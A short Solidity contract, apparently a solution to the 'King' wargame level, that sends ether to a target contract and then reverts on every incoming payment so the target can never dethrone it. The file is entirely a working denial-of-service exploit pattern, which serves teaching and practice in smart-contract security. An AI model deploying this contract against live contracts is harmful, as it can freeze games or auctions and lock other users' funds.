// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IKing {}

contract KingHack {
    address kingContractAddress;

    constructor(address kingContractAddress_) {
        kingContractAddress = kingContractAddress_;
    }

    function attack() public payable {
        kingContractAddress.call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }
}
